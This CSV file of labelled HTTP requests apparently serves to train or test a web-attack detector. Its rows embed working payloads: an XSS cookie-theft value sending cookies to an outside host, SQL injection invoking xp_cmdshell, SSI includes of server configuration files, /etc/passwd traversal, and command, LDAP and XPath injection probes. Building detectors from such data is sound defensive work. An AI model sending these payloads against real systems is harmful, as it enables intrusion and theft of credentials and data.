attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
XPath Injection,medium,,malicious,"POST /download HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Connection: close

search=substring(//user[userid=5]/username,2,1)=CHAR_HERE&id=1320",,223,patt-xpath-injection-0320,PayloadsAllTheThings,"substring(//user[userid=5]/username,2,1)=CHAR_HERE"
SQLi,medium,3.0,malicious,"POST /asehwatfgfif6evth5a/loEmaaotelse5r3nr/usrpasswd93OPS9dh/tbloommeeieq9btw9Z/h7H.3ziHbVgumomEMQ/RinputsvblhG8HkBni/l5xD7.zWLvg0pTLt2OZ/aR8/dprrfixRastau3u0bso/9roptt/aeiJ453.sh? HTTP/1.0
Content-Length: 301
Content-Language: 9t,si4r
Content-Encoding: gzip
Content-Location: /ttngTm/i4oyeee/ihiq6oY/sjaot2cs/36it.cfm
Content-MD5: YTZyb3RzNGNlYWFvdG9wUg==
Content-Type: application/x-www-form-urlencoded
Expires: Sun, 13 Sep 09 12:59:47 CET
Last-Modified: Thu, 16 Feb 06 19:23:57 UTC
Host: www.oninln.de
Connection: keep-alive
Accept: audio/*, image/gif, video/*
Accept-Charset: windows-1255;q=0.4, x-mac-chinesetrad;q=0.6
Accept-Encoding: *;q=0.1
Accept-Language: a-ebaalSrJ, Sebu-nt
Cache-Control: max-age=96
Client-ip: 47.99.144.191
Cookie: hset9RYiee=870782767;recdenmrf=qwer'  or  etllir_v.Account='14h@nn.com
Cookie2: $Version=""66""
Date: Mon, 14 Mar 05 10:12:29 CET
ETag: ""WF4A4@FXbzWEO3h-""
Expect: 100-continue
If-Modified-Since: Sat, 06 May 06 17:34:32 CET
If-Unmodified-Since: Mon, 25 Jul 05 07:31:16 GMT
If-Match: *
If-None-Match: ""1BQ7YkM8t6UXyONrSaSB""
If-Range: Thu, 03 Jan 08 19:25:59 GMT
Max-Forwards: 1
MIME-Version: 2.2
Pragma: ea='ekeVbco'
Proxy-Authorization: 1oi2hy rTepl=hneaC
Authorization: Basic ZW9sZW9zZkI6bmdpc2VkZg==
Range: 169067-0
Referer: http://www.utaeU3.gov/xeUiere/titsmN.nsf
TE: deflate;q=0.0,deflate
Trailer: Authorization
User-Agent: Mozilla/7.2 (X11; U; Linux i586 5.2; 4h-49; rv:7.4.2) Gecko/11447126
UA-CPU: PowerPC
UA-OS: Linux
UA-Pixels: 449x877
Via: FTP/6.4 www.mr9I5l.js
Transfer-Encoding: identity
Upgrade: eni0R/4.4, eoh2/6.7, tsme/6.1
Warning: 901 www.ooto5.jpg ""hxEMfthhileDx"" 
X-Serial-Number: 58260161
----: ----------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

D7blJk=ov9pu&ttnrPe=fcTei2eno&eeov=7897473649&msm=lN@tlshJ&PA_vW@oSCY=47850217&eEetetEa3asr=Rth&sNediirniodb3=41184&0den5lUajlni1ej=-ecawinntjcheoCnaKwu&nstsm9aAhonl=oorth&redMni4e='e&twE1tnydux6e=esve%t1ntFog7O&_g2ZC=nye4&FiqyctDHr3oehpo=81576190&naeNit0n=ahooBxPTzS&connecteEV775YRYz=120288069",42778,2090,xml_test-42778,pkdd,
SSI,medium,4.5,malicious,"GET /wnoe/iueSK/BN4sih3opp/Mieutnra/eawh/c@n/@8WM.png? HTTP/1.1
Host: www.qwnU.ch
Connection: close
Accept: */*;q=0.5
Accept-Encoding: *;q=0.4
Accept-Language: *;q=0.7
Cache-Control: urd=Ac
Client-ip: 154.148.102.124
Cookie: aia2mc5i=tCsrlxAhe;hunsunnutovi=962248;iaNsoysi=5wamiray;ldjeeOxqesd=<!-- #include   virtual=""c:\winnt\system.ini""  -->
Date: Thu, 21 Oct 04 22:40:03 CET
ETag: W/""dmD0AWUHHrhux.bXHm""
If-Match: ""z2UQKYQSbLbWRhDVW""
If-None-Match: *
If-Range: Tue, 03 Jan 06 13:53:35 CET
Max-Forwards: 57
Pragma: tlmatl=lTte
Authorization: tidal 2rne8esa=f3qr
Referer: /eWoey9/natosi/ue5I/bs2Rai.bin
TE: chunked,deflate;q=0.9,trailers
User-Agent: Mozilla/5.9 (Machintosh; U; Mac OS X 6.8; Gm-1n; rv:8.1.4) Gecko/10793114
Via: 1.8 28.46.118.94, HTTP/6.8 56.79.21.178:2222
Transfer-Encoding: gzip
X-Serial-Number: 37172420650440",40374,853,xml_test-40374,pkdd,
XSS,medium,4.0,malicious,"POST /sJtrlXPnetcatdP0FmmailC/viPl0NbIauw2F/3Csock_stream19UIperl/e3hezeyetylta8/zb0u2903BYhW.mspx? HTTP/1.0
Content-Length: 116
Content-Language: 2imaa6,aurenro
Content-Encoding: gzip
Content-Location: /zIns/vDoe/herasg.mdb
Content-MD5: T203TzJNNXNVYmRlOW9ucg==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 23 Sep 05 11:11:33 CET
Last-Modified: Sun, 07 Aug 05 01:11:03 CET
Host: 201.133.16.19:80
Connection: keep-alive
Accept: application/x-tar, audio/basic, video/quicktime;q=0.7
Accept-Charset: *
Accept-Encoding: *;q=0.4
Accept-Language: *;q=0.5
Cache-Control: no-transform
Cookie: saGEqaca1isck=<img src=""livescript:[document.location.replace   ('http://www.nira.com/cgi-bin/tindni.cgi'+document.cookie);]    ""  >;6dmMfieih=Widrtattaitt&t
Cookie2: $Version=""8""
Date: Tue, 27 May 08 03:50:35 GMT
ETag: ""vKPRrbQWtDJl7Ywr""
Expect: 100-continue
From: id5rnsE@noEEndoae.be
If-Modified-Since: Sun, 30 Apr 06 17:18:02 UTC
If-Unmodified-Since: Thu, 10 Apr 08 23:26:51 UTC
If-Match: ""dovB8gv6dbXbckkd""
If-None-Match: *
If-Range: Wed, 08 Aug 07 01:13:16 GMT
Max-Forwards: 61
MIME-Version: 7.8
Pragma: ehe='eo7tatzn'
Proxy-Authorization: NTLM c2xhaGxnYmhveGlsbnh0bThsZXJtZXNlUm51Y2R0Y3RydG4=
Authorization: kEi7l oetde=soyyr
Referer: /eroAa.swf
TE: trailers,trailers
User-Agent: tYlnF3Uivn http://www.icTh.com
UA-CPU: 68000
UA-Disp: 344,654,32
UA-Color: color16
UA-Pixels: 2876x8013
Via: 7.0 www.sf5az.htm, 0.9 www.thltr.png
Transfer-Encoding: compress
Upgrade: HrI/0.5, e5ene/8.3
Warning: 648 51.206.96.111 ""sSooi2nbx5tshecl"" 
----: ------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

xysermfica=mSey&roguiS=7343&eds=mdRaestylescctaejuenaxhaving&aruas7mteSizr6o=s&1rdksi=8003060&ncrh4nxoWvx=edocument",48247,1778,xml_test-48247,pkdd,
SSI,medium,4.0,malicious,"PUT /fnte6oo0r/ogRqESCg/lvehhlzusee.mspx? HTTP/1.0
Content-Length: 213
Content-Language: ssOrht,sn1ettVh,tubl7
Content-Encoding: identity
Content-Location: /onro/fnecedr/4snNii4/5anp.dll
Content-MD5: eWV0bGVhR29zY2V0Tk1OZQ==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 21 Nov 06 23:15:18 GMT
Last-Modified: Fri, 18 Feb 05 19:22:42 UTC
Host: www.hliga.st
Connection: hnrsa
Accept: */*
Accept-Charset: windows-1251;q=0.0, iso-8859-4;q=0.1, x-mac-cyrillic;q=0.5, iso-8859-4, utf-7;q=0.3
Accept-Encoding: 
Accept-Language: *;q=0.4
Cache-Control: agbnne4='rzigaI'
Client-ip: 145.102.168.110
Cookie: dsai=n;lymt=iAeea;riPoeraOH9891na=ygwnMzZi;CmetaADn@=dmi otanaA0ps;nph-_nQd8ooa=582046
Cookie2: $Version=""0""
Date: Tue, 06 Oct 09 17:04:10 UTC
ETag: ""E-DjyT8l5_1VDtzNt-o""
Expect: t7ug=t2ana;oee3=fmtY
If-Modified-Since: Sat, 30 Jun 07 04:17:02 UTC
If-Unmodified-Since: Sat, 10 Oct 09 11:28:42 CET
If-Match: ""60iTwuKyZWjIevA""
If-None-Match: *
Max-Forwards: 739
Pragma: no-cache
Authorization: NTLM a2RkZHVoZ2V0RWF0ZWhpN25jaXV0c280aUVvZ29wbDJvaW50bGdMYWtlcW9u
Referer: /epl6/maau.mspx
TE: trailers,gzip;q=0.4
User-Agent: rEn3oNm_ http://www.rkqotdF.org
UA-CPU: x86
UA-OS: Windows 98
Via: 1.4 147.201.129.5, 6.7 42.203.74.130, FTP/6.8 www.coGgsodh.htm
Transfer-Encoding: compress
----: -------------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~

nqlLNng=2ofb/&reeoenO=<!--     #include    virtual=""/etc/httpd/httpd.conf""-->&eBfntgYIodecp=ddNot6dQ&r8cun8od=ancgnsfo7a1st&y0biaeewfoitatn=eloWdcn1io&w3eenssvr=q&ondwisOdcwwwo=mo3s&ndtsz=848",39577,1599,xml_test-39577,pkdd,
Command Injection,medium,,malicious,"POST /exec HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Connection: close

query=; echo $(echo ""$(whoami)"")&trace=1006",,0,kaggle-cmdi-006,KaggleWebPayloads,"; echo $(echo ""$(whoami)"")"
Command Injection,medium,,malicious,"POST /auth HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close

name=echo whoami|$0&id=1862",,185,patt-command-injection-0862,PayloadsAllTheThings,echo whoami|$0
XPath Injection,medium,4.5,malicious,"PUT /2PEh4O/82D/Yp-7@/tfbtramwc/tKQUbp37m3jD083alsdY/VPwEb4MHtmp2H.msf? HTTP/1.1
Content-Length: 221
Content-Language: shg,rreyue,n
Content-Encoding: gzip
Content-Location: /mddsy/lAln/IaAenl.dll
Content-MD5: dWV0aGE5c2ZtZTRyZHM1bg==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 01 Jun 07 04:51:35 UTC
Last-Modified: Sun, 24 Jun 07 22:46:03 CET
Host: www.euhisdApsf.ch
Connection: close
Accept: */*;q=0.3
Accept-Charset: us-ascii;q=0.1
Accept-Encoding: 
Accept-Language: p9-yrsnihny;q=0.0, ljdnafn2-wun3rs;q=0.9
Cache-Control: min-fresh=955
Cookie: u0teseS8x7teic=O/f/m/child::node()[  position()=117]     |   cmr/m/fbni/child::text()[position()=969]    or     'Eb'  =   '
Cookie2: $Version=""8""
Date: Fri, 12 May 06 21:48:24 GMT
If-Unmodified-Since: Sat, 13 Oct 07 09:48:43 UTC
If-Range: *
Referer: http://7Tcleare.uk/htDos.asp
User-Agent: Mozilla/6.3 (compatible; 5enhul0xzy; Open BSD i386; Srmoerc0; haez)
Transfer-Encoding: cHen9e

0paceozmineDir=u&OdWQH=l96yXtU&iisiiIeo5Sf=27&ib8tlfesc=t &neekelltwi5ne=53932&2t=eisaeM&dnozE4kta=6&7Nohsnho=7846&yf.@echo@gxY=eiee0t&pemovo8=6enllyahiCriA&ledto6txaeioy=4760966&8m@us=a-yXt&uodhgds7r=cjejtu&sgd=217709207",35919,1198,xml_test-35919,pkdd,
XSS,medium,4.0,malicious,"PUT /eAU0vKywdFmpAD3cJ171/Mor/it/6TQJ5ZW9m9dXvSAI0P/io/p5Isismsrl/U32i.css? HTTP/1.0
Content-Length: 168
Content-Language: eskfuw
Content-Encoding: gzip
Content-Location: /7nids/eyzez/rhn5ser/elean.zip
Content-MD5: cjJvN251c3Q0c2VzYWVOdg==
Content-Type: application/x-www-form-urlencoded
Expires: Thu, 18 Sep 08 08:12:43 CET
Last-Modified: Sun, 30 Sep 07 20:11:26 GMT
Host: www.rdss.st
Connection: close
Accept: application/*;q=0.1
Accept-Charset: *
Accept-Encoding: 
Accept-Language: *
Cache-Control: max-age=8978
Client-ip: 145.84.197.68
Cookie: 9WVSauYsystemxtermSperl8=<img  src   = ""  rorime   ""onmouseover   = "" [alert ('ji');]    ""  >;qdeaanetwte3inh=ahr;s1feiaor=eftu5eU5r;tl=ivlennaRtirh
Cookie2: $Version=""1""
Date: Sat, 26 Jan 08 13:32:36 CET
ETag: ""MtTZ5vY5WHusiemJv""
If-Modified-Since: Wed, 12 Oct 05 19:13:24 GMT
If-Unmodified-Since: Tue, 30 Jan 07 06:22:21 UTC
If-Match: *
If-None-Match: *
If-Range: ""0VL_V5gvupVFO1KI8TB""
Max-Forwards: 3604
MIME-Version: 3.3
Authorization: ndLoy oHanesEu=Anil
Referer: http://oniWmd.cz/eakwHel/61Oa6ieo/tensc/eiiSyAOO/swfh.cgi
TE: deflate;q=0.2,trailers
User-Agent: Mozilla/7.0 (Windows; U; Win 9x 2.5; ht-nw; rv:9.7.4) Gecko/04005366
UA-Disp: 8989,2984,8
UA-OS: Windows NT
Via: cenivE/5.8 www.ntSn.gif, Nnu/6.5 www.hETtr.css:51293, 2.2 224.113.3.14
Transfer-Encoding: eoeian; mdden=ofAsfne5
Upgrade: uitmh/9.8, klde/1.2
X-Serial-Number: 036132997114455
----: -----------------------

5Sjestind9sO=4069&ly3py=87174&it=btt&uxoiw9hngml90=649228&tWsxz=5818&Gg5iframeKG=ti1s~7 &eNsnrte=poAeFOHqaM1c&otjl=7264017&nne1mzekiec=640967080&eudb=54686&new=541024",48287,1639,xml_test-48287,pkdd,
LDAP Injection,medium,,malicious,"POST /auth HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close

comment=(&(sn=administrator)(password=MYK*)) : OK&id=1097",,215,patt-ldap-injection-0097,PayloadsAllTheThings,(&(sn=administrator)(password=MYK*)) : OK
SQLi,medium,3.0,malicious,"GET /eisttAi/eqM/hsoesihC/lq8yYaeWIZ_w/qEWaHpxiMNYi/nH/f6Y__wqyqS-L/cekoiN6kK_/qoh6Kf9metakKb4B6z/fXAdGK04/ab3kmeX3aIxrYcwq0F/wcmyNIfSmLLHYP6JwSE.pl?ef52htaccesnT1oQ-m=%3B+++EXEC%28++++%27UNI%27%2B%27ON%27%2B%27+++%27%2B%27SEL%27%2B%27ECT++++++%27A7knvsj%27%2C9%2C5940259%2C%27etD%27%2C9++FROM++de0Qhrr%29 HTTP/1.1
Host: www.5nendta.de:80
Connection: close
Accept: audio/basic;q=0.0
Accept-Charset: *
Accept-Encoding: identity;q=0.4
Accept-Language: *;q=0.3
Cache-Control: max-age=7
Client-ip: 250.22.146.196
Cookie: ositxtrq6ehdehp=5246;EEhanSDautoexec10vq=r;ooena=mrhiC69utbthi
Cookie2: $Version=""408""
Date: Wed, 26 Nov 08 01:26:26 CET
ETag: ""RUw27n@HrEB-YAKv""
Expect: 100-continue
From: vlIol@haea.org
If-Modified-Since: Mon, 14 Dec 09 06:24:53 UTC
If-Unmodified-Since: Thu, 12 Apr 07 15:53:26 CET
If-Match: ""YfyF@F3US0_N7MgD5oI""
If-None-Match: ""@@0ePc4vYQG8BPHB""
If-Range: Tue, 04 Nov 08 24:18:15 GMT
Max-Forwards: 6
MIME-Version: 5.2
Pragma: no-cache
Proxy-Authorization: NTLM bG5sc2NhT05hdHJyZnVhRWljaWVub3B4eThwc2hUaWhocmgxb2FnYnRiMXo1dw==
Authorization: NTLM bmlkZHRkOXNoZGU3dGJ2c2RiZXJQOWEwZXRvbW9lZnNvUlBONQ==
Range: -11289
Referer: http://dtps2nol.org/HTe5ne/yznWi.nsf
TE: chunked,trailers,trailers
Trailer: Upgrade
User-Agent: Mozilla/3.4 (Windows; U; WinNT 1.6; gs-eN; rv:7.5.6) Gecko/74337578
UA-CPU: Sparc
UA-Disp: 041,9154,16
UA-OS: FreeBSD
UA-Color: color8
UA-Pixels: 064x464
Via: rmhrf/0.8 170.142.68.76:692, 1.0 192.62.242.106:7
Transfer-Encoding: gzip
Upgrade: liaory/2.2, awo4ag/4.5, oil/7.5, ctOl/2.3, see/4.6
Warning: 419 www.riae.jpeg ""t4xtspnneyygypw1bdf"" ""Thu, 20 Aug 09 21:25:22 GMT""
X-Forwarded-For: 239.30.161.125
X-Serial-Number: 215683669428
----: -------------------
~~~~~: ~~~~~~~~~~~~~~~~~",41640,1765,xml_test-41640,pkdd,
SQLi,medium,3.0,malicious,"GET /riiEm@R4oN/Z4selectI-Wi/19processing-instructionFS/gasLfr/t@cKqC7WIv54ZUWOmR.jpg?tosMoieorn9hNd9=or+++++0%3C%3E%28select++++count%28*%29+++from+++wniIf%29&EuOSU.wGA=365&ahbnckrh6ddaRse=49408&Q-Y6execq=285&yanzeqtp=%28%5B9o&htbi72tdi5i=a%3Byut%2Flbetweents6e HTTP/1.0
Host: 92.238.168.162
Connection: eiedE3
Accept: image/png;q=0.7, audio/x-wav, text/html
Accept-Charset: *
Accept-Encoding: *;q=0.9
Accept-Language: Jti-net;q=0.9, pd-Nmptoia, r1n9en8a-a;q=0.0
Cache-Control: only-if-cached
Client-ip: 102.180.54.45
Cookie: e8=1265060264;eeuwoa=edDNL
Cookie2: $Version=""717""
Date: Thu, 25 Jun 09 13:52:10 CET
ETag: ""sVe4cTNh_tT9Of5""
Expect: 100-continue
From: 4zD9@jt6etwau5.be
If-Modified-Since: Mon, 15 Jan 07 20:24:15 UTC
If-Unmodified-Since: Mon, 03 May 10 20:05:42 GMT
If-Match: *
If-None-Match: ""O1w-Jsqx72emG7d4wbl""
If-Range: Sat, 25 Sep 04 13:40:58 GMT
Max-Forwards: 75
MIME-Version: 0.8
Pragma: no-cache
Proxy-Authorization: Digest nonce
Authorization: Basic V2VibzppeXRRYmJo
Range: 991-40833,238399-36
Referer: http://www.Daxstd.net/Tidsah/erirsIf6/oRwd.cfm
TE: deflate,gzip;q=0.9,trailers
Trailer: Proxy-Authorization
User-Agent: Mozilla/5.7 (Windows; U; Win98 6.8; mn-un; rv:4.1.7) Gecko/91720625
UA-CPU: MIPS
UA-Disp: 4298,556,32
UA-OS: Windows 98
UA-Color: color32
UA-Pixels: 329x4778
Via: seQnm/8.6 81.43.123.224, HTTP/9.0 www.n2esy.tiff:2710
Transfer-Encoding: identity
Upgrade: osgosN/1.6, nzpps/5.5, rhoft/4.2, feo/7.7, htler/3.3
Warning: 494 42.216.10.168:95428 ""esi7pe3nyrrtei"" ""Wed, 28 Apr 10 16:07:09 UTC""
X-Forwarded-For: 88.3.128.18
X-Serial-Number: 41242078999326437
----: ---------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",41968,1703,xml_test-41968,pkdd,
SQLi,medium,3.0,malicious,"GET /d2Ckc/y7SX4FC2ZpJhAuP5/o.d53fMy2BQ/eermsthiudh8kbOa/dncepmhSmhteroohtr.cgi?rua=t2T&6sy8rttyUpece=ine+nim&b50dTVjQTl=dy&nh1=yglkimoftdNvyfdoa&hmnx=aU3E.MCG6s&eofd8=exec+++xp_cmdshell+++++%27%22i8n1Astltc%22+++++%3E%3E++++script.vbs%27&n3neirnpf2cr9=td2&deaajcTo=hhoexaohnmcsucts%29R&lbsbd=ss0bf2&6zaAtntku8n=974596 HTTP/1.0
Host: www.ThOy.fr
Connection: keep-alive
Accept: image/jpeg;q=0.9
Accept-Charset: *
Accept-Encoding: deflate, deflate
Accept-Language: rmw-a;q=0.2, odRnocWu-IarisImt, 7dHE-nt;q=0.5, ew-t6e8h, 4Me-sods7re;q=0.3
Cache-Control: only-if-cached
Client-ip: 2.230.114.150
Cookie: rrplike@passwdjY=2Qdnmj.;jtls=hi1;rsiMiR6itAAhts=(eliftp;eeAinz=133019;ui6welinr=nXfBz-e-;nMidmiuQ50e=ynldcuxinirSxtdB
Cookie2: $Version=""66""
Date: Sat, 02 Jan 10 22:50:51 GMT
ETag: W/""Vc2bixOBDSoczi4S""
Expect: yuEtt
From: spbhn@ispeCheey.net
If-Modified-Since: Tue, 17 Feb 09 14:47:11 CET
If-Unmodified-Since: Tue, 13 Jan 04 14:34:07 UTC
If-Match: ""a9ole1Jb_W6diAhPC@""
If-None-Match: *
If-Range: *
Max-Forwards: 7
MIME-Version: 2.6
Proxy-Authorization: dEwdh oSgoauto=ctAcmei
Authorization: lIainj 9eeoiltf=seddibai
Range: 770-,-93926
Referer: http://wuelsmen.net/o0oain9s/m2spsh/1lrnoiw/tsod/3bnf2u.pdf
TE: trailers,trailers,gzip;q=0.9
User-Agent: Mozilla/9.9 (Windows; U; WinNT 2.6; dr-no; rv:5.8.7) Gecko/56137905
UA-Disp: 3796,7783,32
UA-Color: color16
UA-Pixels: 6152x736
Via: FTP/2.4 www.hdylu.htm
Transfer-Encoding: identity
Upgrade: ueiDt/4.5, Y8a3e/0.2, set/3.6, emlvo/5.7
Warning: 484 www.41xtiu.shtml ""ffgplwga7ia3nttt"" ""Sun, 25 Apr 10 04:50:48 UTC""
----: -------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",41026,1688,xml_test-41026,pkdd,
Command Injection,medium,,malicious,"POST /view HTTP/1.1
Host: app.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Connection: close

path=& ping -n 30 127.0.0.1 &&id=1807",,189,patt-command-injection-0807,PayloadsAllTheThings,& ping -n 30 127.0.0.1 &
XPath Injection,medium,3.0,malicious,"POST /ael8jenpta5bTee6/kQnMfS/s97ACF3swewC.1OGc_53/ko3ECdaUm/hI@AoMe@AAA/t3GUxEpcHqe5E@8Vb-/acr8ei8tvet/tzynbP/MQpC0/oincludej/nmr3pgc4sxnyeeEa/eVVQrz.gg8r.shtml? HTTP/1.1
Content-Length: 341
Content-Language: linsdn
Content-Encoding: identity
Content-Location: /iIdoa/tnun0re1.zip
Content-MD5: cXd3MGZjYWVkc2FpbnJkaQ==
Content-Type: application/x-www-form-urlencoded
Expires: Sat, 25 Dec 04 21:46:10 UTC
Last-Modified: Fri, 20 Oct 06 21:50:25 UTC
Host: www.cms7Uoej.gov
Connection: close
Accept: image/gif;q=0.3, text/html;q=0.0
Accept-Charset: iso-8859-15
Accept-Encoding: 
Accept-Language: *;q=0.3
Cache-Control: Lidehb5='bjetep8'
Client-ip: 192.64.250.181
Cookie: rsrlianurese=oer/naac/b/child::node()[  position()=09]   | g1snpe/no9Tg/na/child::text()[position()=5]   or  'Oreon'  =  '
Cookie2: $Version=""65""
Date: Wed, 14 Apr 10 12:53:25 UTC
ETag: W/""xxZkvUNV5QW_.u7aV""
Expect: 100-continue
If-Modified-Since: Tue, 03 Jul 07 19:00:15 GMT
If-Unmodified-Since: Wed, 12 Apr 06 01:28:33 GMT
If-None-Match: ""bO6GMFzU7zvS9rdviN""
If-Range: *
Max-Forwards: 7
MIME-Version: 8.3
Proxy-Authorization: dTgybu eztwn=NSi2fr
Authorization: Basic N2FpZWVhOmVyaXM2YQ==
Range: 6888-
Referer: /iiigeTi.cfm
TE: chunked,chunked,trailers
User-Agent: eloehrsstt
UA-Disp: 139,013,32
Via: 4.1 32.129.124.219
Transfer-Encoding: n3ssh
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

ihlOrnidsche=tt&ahis8ifloEde=eS9xeftiwbos2NemEf&ens8t3s=lTdobqupdateo)[rhe0s6?&nreaio2tyhiu=1804782454&oiitlx=seN&coevKre=1hon3goseEit&hshutdown5YBBWey1update=616569&ereenisnisde=hisdrhioerwsn&Seahantg9Rt6t=oekrefti0hnveho2JU&yefa=95707&ojothqnpkateids=2&3EmTv=mkGaC-1E&risshe7b=iAcdameo&9benactiict0ca=pt tg7&5turiau=ddxt0jssooHxvu6oo",50107,1729,xml_test-50107,pkdd,
Path Traversal,medium,,malicious,"POST /comments HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Connection: close

file=%252e%252e%255c%252e%252e%255c/etc/passwd&id=2030",,221,patt-path-traversal-1030,PayloadsAllTheThings,%252e%252e%255c%252e%252e%255c/etc/passwd
Command Injection,medium,,malicious,"POST /auth HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Connection: close

search=swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi&id=1949",,250,patt-command-injection-0949,PayloadsAllTheThings,swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
,hard,-2.0,benign,"PUT /4nJt/eoyngdmeylih5c1aeem/DhntnpoEoyyes/nhltybt/aloEe4s0aenlnos/GbX1HulQWG/inmIArad4_q/rZb6@r5fGnYOzGPt5u/tsmomno/it8hbG1mO1vRbmjlNfc/ectitSfitffp/xedKepn2fZcF97Tj8s.mspx? HTTP/1.1
Content-Length: 202
Content-Language: uhf,qs9hete
Content-Encoding: deflate
Content-Location: /4eeh.png
Content-MD5: dGFubFJ2czdzYmxpZGhldQ==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 11 Jul 08 03:01:25 UTC
Last-Modified: Sat, 19 Dec 09 14:40:49 UTC
Host: 220.41.161.67
Connection: keep-alive
Accept: text/*;q=0.8, image/*;q=0.4
Accept-Charset: x-mac-japanese;q=0.0, x-mac-arabic, euc-kr, hz-gb-2312, iso-2022-jp
Accept-Encoding: compress
Accept-Language: 0ms-bs;q=0.5
Cache-Control: only-if-cached
Client-ip: 225.243.67.249
Cookie: eeiqouam=eSceHemsSadf;wztmp1Yyg9vH=O9qAar 2<;i3L1kTf@Rh2.=2861;eyssa8trsr=etis
Cookie2: $Version=""5""
Date: Wed, 13 May 09 04:05:28 GMT
ETag: W/""n27WAq61tVTD_bNT8""
Expect: atro=ooe5
From: nhostr0g@gey2ahsod.de
If-Modified-Since: Sun, 07 Jun 09 01:07:56 CET
If-Unmodified-Since: Fri, 11 Nov 05 17:22:49 CET
If-Match: *
If-None-Match: *
If-Range: Mon, 15 Jun 09 01:17:10 UTC
Max-Forwards: 6107
MIME-Version: 1.5
Pragma: no-cache
Proxy-Authorization: Basic a3B3UGl1Omh0bWl0dHhl
Authorization: Basic d2JlTm86d3N1bGJl
Range: -0226,-162
Referer: http://obesaee.cz/xEor/dTle3e/deuass/B8tQ.jsp
TE: trailers
Trailer: Upgrade
User-Agent: asajpo http://www.eOBo.ch
UA-CPU: Sparc
UA-Disp: 1557,362,16
UA-OS: Windows NT
UA-Color: color32
UA-Pixels: 7210x017
Via: 7.3 213.205.21.199, FTP/8.5 102.35.69.162
Transfer-Encoding: compress
Upgrade: trRo/5.6, ifba/9.6, zny5I0/7.1, eloec/8.2, jblog/3.6
Warning: 024 www.O7oep.htm ""aennnrtyleRmrdHsfeP"" ""Wed, 26 May 04 05:12:06 CET""
X-Forwarded-For: 88.220.41.73
X-Serial-Number: 940687449310
----: ----------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~

or8pdse=hj;hZ&BYK1HPwS6Q=sPehaeuv&dnyeoae2e=4&SssihLo=2jiI-Dk&Yb-cP6=a44x6ThK_3h&UdOtsfdA6r=ar7usw9crpiistt&dslqdlentrPtS=bsmL&tlnntWbKan=Tis&igheeezcqh=>0lu1? rhi&ee1=scriptTns|'wp-dTftebs5n8",7944,2081,xml_test-7944,pkdd,
SSI,medium,,malicious,"POST /auth HTTP/1.1
Host: intranet.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Connection: close

comment=<!--#include file=""..\..\web.config"" -->&id=1601",,213,patt-ssi-0601,PayloadsAllTheThings,"<!--#include file=""..\..\web.config"" -->"
